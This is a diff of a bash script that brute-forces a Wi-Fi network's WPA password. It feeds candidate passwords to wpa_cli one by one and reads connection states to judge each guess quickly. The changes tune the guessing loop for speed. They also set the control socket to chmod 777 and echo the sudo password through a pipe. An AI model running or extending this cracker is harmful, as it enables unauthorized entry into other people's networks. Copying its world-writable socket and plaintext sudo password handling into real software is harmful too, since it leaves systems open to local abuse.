@@ -408,9 +408,12 @@ ctrl_interface=$CTRL_DIR
 update_config=1
 WPAEOF
     SUDO wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null
-    sleep 1
-    # 改 socket 权限让后续 wpa_cli 不用 sudo
-    SUDO chown "$USER:$USER" "$CTRL_DIR/$INTERFACE" 2>/dev/null || true
+    # 等 socket 创建，改权限让 wpa_cli 无需 sudo
+    for ((j=0; j<30; j++)); do
+        [ -S "$CTRL_DIR/$INTERFACE" ] && break
+        sleep 0.1
+    done
+    SUDO chmod 777 "$CTRL_DIR/$INTERFACE" 2>/dev/null || true
 
     local attempt=0 start_time found=0 found_pwd=""
     start_time=$(date +%s)
@@ -454,20 +457,26 @@ WPAEOF
         echo ""
         echo -e "  ${GY}按 S 停止 | Q 退出${R}"
 
-        # 只换密码，不动 SSID (首次自动创建网络)
-        if [ "$attempt" -eq 1 ]; then
-            wpa_cli -p "$CTRL_DIR" add_network >/dev/null 2>&1
-            wpa_cli -p "$CTRL_DIR" set_network 0 ssid "\"$SELECTED_SSID\"" >/dev/null 2>&1
-        fi
-        wpa_cli -p "$CTRL_DIR" disable_network 0 >/dev/null 2>&1 || true
-        wpa_cli -p "$CTRL_DIR" set_network 0 psk "\"$pwd\"" >/dev/null 2>&1
-        wpa_cli -p "$CTRL_DIR" enable_network 0 >/dev/null 2>&1
+        # 热切换密码 — 一次 sudo 管道批量完成
+        {
+            echo "$SUDO_PASS"
+            if [ "$attempt" -eq 1 ]; then
+                echo "add_network"
+                echo "set_network 0 ssid \"$SELECTED_SSID\""
+            fi
+            echo "disable_network 0"
+            echo "set_network 0 psk \"$pwd\""
+            echo "enable_network 0"
+        } | sudo -S wpa_cli -p "$CTRL_DIR" >/dev/null 2>&1
 
-        # 轮询 — 0.1秒快速轮询，错误密码秒判
+        # 等待扫描启动 (扫描至少需1秒，先睡后查避免白轮询)
+        sleep 1
+
+        # 轮询 — 每0.2秒查一次，最多等3秒
         # 正确: DISCONNECTED→SCANNING→ASSOCIATED→4WAY_HANDSHAKE→COMPLETED
-        # 错误: 4WAY_HANDSHAKE→DISCONNECTED (握手失败，状态转换秒判)
+        # 错误: 4WAY_HANDSHAKE→DISCONNECTED (握手失败秒判)
         local last_state=""
-        for ((i=0; i<40; i++)); do
+        for ((i=0; i<15; i++)); do
             wpa_state=$(wpa_cli -p "$CTRL_DIR" status 2>/dev/null | grep "^wpa_state=" | cut -d= -f2)
             [ -z "$wpa_state" ] && wpa_state="$last_state"
 
@@ -475,17 +484,16 @@ WPAEOF
 
             case "$wpa_state" in
                 "4WAY_HANDSHAKE"|"GROUP_HANDSHAKE"|ASSOCIATED)
-                    [ $i -gt 30 ] && break ;;  # 握手等3秒
-                SCANNING)
-                    [ $i -gt 8 ] && break ;;   # 扫0.8秒不到→没网络
+                    ;;  # 握手/关联中，继续等
                 DISCONNECTED|INACTIVE)
-                    # 握手后断开→密码错，秒判; 一直断开→1秒判死
+                    # 握手后断开→密码错，秒判
                     [[ "$last_state" =~ HANDSHAKE|ASSOCIATED ]] && break
-                    [ $i -gt 10 ] && break ;;
+                    [ $i -gt 4 ] && break      # 1秒还断开→死
+                    ;;
             esac
             last_state="$wpa_state"
 
-            read -t 0.1 -n 1 key 2>/dev/null < /dev/tty || true
+            read -t 0.2 -n 1 key 2>/dev/null < /dev/tty || true
             [ -n "$key" ] && {
                 case "$key" in
                     's'|'S') ABORTED=1; break 2 ;;
